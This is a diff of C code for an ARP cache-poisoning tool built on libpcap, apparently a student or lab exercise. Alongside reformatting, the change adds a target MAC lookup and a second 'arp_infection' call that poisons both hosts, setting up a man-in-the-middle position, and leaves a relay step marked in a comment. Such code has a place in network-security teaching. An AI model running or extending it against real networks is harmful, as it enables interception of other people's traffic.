@@ -238,7 +238,10 @@ get_my_mac (
             perror( "ioctl() - SIOCGIFHWADDR" );
             return -1;
         }
-        convrt_mac((const char*)ether_ntoa((struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), (char*)my_al->mac, ETHER_ADDRSTRLEN);
+        convrt_mac(
+		(const char*)ether_ntoa(
+		    (struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), 
+		(char*)my_al->mac, ETHER_ADDRSTRLEN);
 	printf("My IP Address : %s\n", my_al->ip);
 	printf("My MAC Address : %s\n", my_al->mac);
     }
@@ -298,25 +301,46 @@ main (
     }
 
     // Get Sender's MAC Address
-    if(normal_arp(handle, 
+    if(normal_arp(
+		handle, 
 		(const byte*)my_al.mac, 
 		(const byte*)my_al.ip, 
 		s_al[0].mac, 
-		(const byte*)s_al[0].ip)) 
+		(const byte*)s_al[0].ip)
+    && normal_arp(
+		handle,
+		(const byte*)my_al.mac,
+		(const byte*)my_al.ip,
+		t_al[0].mac,
+		(const byte*)t_al[0].ip)) 
     {
 	puts("===== ARP Request Result ====");
 	printf("Sender's MAC Address : %s\n", s_al[0].mac);
 	puts("=============================");
+	printf("Target's MAC Address : %s\n", t_al[0].mac);
+	puts("=============================");
 
-	arp_infection(handle, 
+	arp_infection(
+		handle, 
 		(const byte*)my_al.mac, 
 		(const byte*)t_al[0].ip, 
 		(const byte*)s_al[0].mac, 
 		(const byte*)s_al[0].ip);
+	arp_infection(
+		handle,
+		(const byte*)my_al.mac,
+		(const byte*)s_al[0].ip,
+		(const byte*)t_al[0].mac,
+		(const byte*)t_al[0].ip);
+
+	//relay
     }
 
     /* And close the session */
     pcap_close(handle);
 	    
+    free(s_al);
+    free(t_al);
+
     return(0);
 }
